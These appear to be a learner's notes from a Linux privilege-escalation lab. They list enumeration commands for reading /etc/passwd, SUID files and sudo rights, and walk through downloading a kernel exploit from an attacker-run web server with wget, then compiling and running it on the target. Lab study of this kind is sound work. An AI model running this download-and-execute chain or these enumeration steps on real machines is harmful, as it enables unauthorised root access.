Linux Privilege Escalation:
    * Definition "Exploitation of a vulnerability, design flaw or config oversight to gain unauthorised access to resources, usually restricted from users."
    * Going from low privileges to high.
    * Rare that a foothold will grant administrative access.
    * Therefore, very important for:
        [
            Resetting passwords
            Bypassing access controls to compromise protected data
            Editing software configurations
            Enabling persistence
            Changing the privilege of existing (or new) users
            Execute any administrative command
        ]

    "ENUMERATION:"
        * This is the first step upon gaining foothold. 

        Commands: (navigating linux)
        [hostname]                  Returns hostname of the target machine. Can provide information about the target systemâ€™s role 
        [uname -a]                  Prints system info, including details of kernel. 
        [/proc/version]             Provides info on the processes running on target system. Kernel info and more, whether a compiler is installed, (GCC).
        [/etc/issue]                Information about the operating system.

        [ps]                        process status. Output has PID, TTY (terminal type), Time (Amount of CPU time used), CMD (Command or executable running).
            [ps -A]                 Show all processes running.
            [ps axjf]               View process tree
            [ps aux]                Shows process for "A"ll users, "U"ser that ran the process, and shows processes not attached to terminal (X).

        [env]                       Shows environmental variables.
        [sudo -l]                   Shows all sudo commands that can be ran by current user.
        
        [ls]                        Show files and directories at current location.
            [ls -la]                Show all (including hidden) files and folders at current location.

        [id]                        Provide a general overview of privilege level & group memberships.
        [id OTHERUSER]              Provide general overview of privlege level & group memberships for OTHERUSER.

        [/etc/passwd]               Easy way to discover users on a system.
            [cat /etc/passwd | cut -d ":" -f 1]         Cut and convert etc/passwd, useful to create brute force list.
            [cat /etc/passwd | grep home]               Users likely have a home directory, hence grep for it! Shows users.

        [history]                   Shows previously entered commands.
        [ifconfig]                  Show network interface info. 
        [ip route]                  See which network routes exist.

        [netstat]                   Gather information on existing connections.
            [netstat -a]            Show all listening ports and established connections.
            [netstat -at]           List TCP protocols.
            [netstat -au]           List UDP protocols.
            [netstat -l]            List ports in listening mode. These are open and ready to accept incoming connections.
            [netstat -s]            List network usage statistics by protocol. add -t or -u to limit output to specific protocol.
            [netstat -tp]           List connections with service name and PID.
            [netstat -ano]          -a : Display all sockets    -n : Do not resolve names   -o : Display timers

        [find]                      Very useful for searching current directory
            [find . -name flag1.txt]        Tries to find flag within current directory.
            [find /home -name flag1.txt]    Find flag within home.
            [find / -type d -name config]   Find directory named config under "/"
            [find / -type f -perm 0777]     Find files with 777 permissions. These are readable, writeable, executable by all users.
            [find / -perm a=x]              Find executable files.
            [find /home -user frank]        Find all files for user frank under /home
            [find / -mtime 10]              Find files modified within the last 10 days.
            [find / -atime 10]              Find files accessed within last 10 days.
            [find / -cmin -60]              Find files changed within the last hour.
            [find / -amin -60]              Find files accessed within the last hour.
            [find / -size 50M]              Find files of size 50Mb
            [find / -size 50M]              Find files larger than 50Mb, use - for smaller than 50Mb.

            "NB find tends to produce errors, hence send these errors to /dev/null to get clean output:"   append [-type f 2>/dev/null]
                [find / -size +100M -type f 2>/dev/null]

            "Folders and files that can be written or executed from:"       These 3 do the same thing, helpful because perm changes how find works.
                [find / -writable -type d 2>/dev/null]      Find world writeable files
                [find / -perm -222 -type d 2>/dev/null]     
                [find / -perm -o w -type d 2>/dev/null]     

                [find / -perm -o x -type d 2>/dev/null]     Find world-executable folders.

            "Find development tools and supported languages"
                [find / -name perl*]
                [find / -name python*]
                [find / -name gcc*]

            "SUID bit being set, allows a file to be ran with the privilege of the account that owns it, not that of the account that runs it!"
                [find / -perm -u=s -type f 2>/dev/null]     Find files with SUID bit set, allows us to run file with higher priveleges than current user.
                
            "Other helpful general commands:"
                [find, locate, grep, cut, sort]



    "AUTOMATED ENUMERATION TOOLS:"
        * List of popular Linux enumeration tools:
                LinPeas:                            https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
                LinEnum:                            https://github.com/rebootuser/LinEnum
                LES (Linux Exploit Suggester):      https://github.com/mzet-/linux-exploit-suggester
                Linux Smart Enumeration:            https://github.com/diego-treitos/linux-smart-enumeration
                Linux Priv Checker:                 https://github.com/linted/linuxprivchecker 

        
    "Privilege Escalation: Kernel Exploits:"
        * Ideally, we want root privileges. Can be done by exploiting vulnerability, or by changing to a higher privilege user.
        * Unless a single vulnerability gives root priv, we are going to rely on misconfigurations and lax permissions.

        ** Kernel in Linux systems manages the communication between components such as memory on the systems and applications.
        ** Thus kernel must have specific privileges, suggesting a successful exploit will lead to root privileges.
        * The process for kernel exploits is:
            1.  Identify the kernel version
            2.  Search and find an exploit code for the kernel version of the target system
            3.  Run the exploit 

        ** FAILED KERNEL EXPLOIT CAN LEAD TO SYSTEM CRASH!

        Resources for Kernel exploits:
            * Previously used Exploit DB.  https://www.cvedetails.com/ 
            * Or use a script such as "LES" (Linux Exploit Suggester). Beware of false positives and negatives!

        Note when searching for vulnerabilities:
            [Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit]

            [Be sure you understand how the exploit code works BEFORE you launch it. 
            Some exploit codes can make changes on the operating system that would make 
            them unsecured in further use or make irreversible changes to the system, creating problems later. 
            Of course, these may not be great concerns within a lab or CTF environment, 
            but these are absolute no-nos during a real penetration testing engagement.]

            [Some exploits may require further interaction once they are run. 
            Read all comments and instructions provided with the exploit code.
            You can transfer the exploit code from your machine to the target system using the 
            SimpleHTTPServer Python module and wget respectively.]

            
"LOCAL IP"      []
"TARGET IP"     [10.10.186.135]
        "TASK 5 | Privilege Escalation: Kernel Exploits"
            "Start the Python server from the directory that contains the file!"
            * [python3 -m http.server 808]         On attacker, start web server
            * [cd ..]                               Navigate to /tmp
            * [wget 10.10.77.254:808/37292.c]      Gets file onto target through SSH!
            * [gcc 37292.c -o 37292]                Compile the file
            * [./37292]                             Run the exploit
            
        "Task 6 | Sudo"
        * [sudo -l]                                 Shows possible sudo options
        * "https://gtfobins.github.io/"             Curated list of Unix binaries that are exploited to bypass local restrictions on misconfigured system
        * 

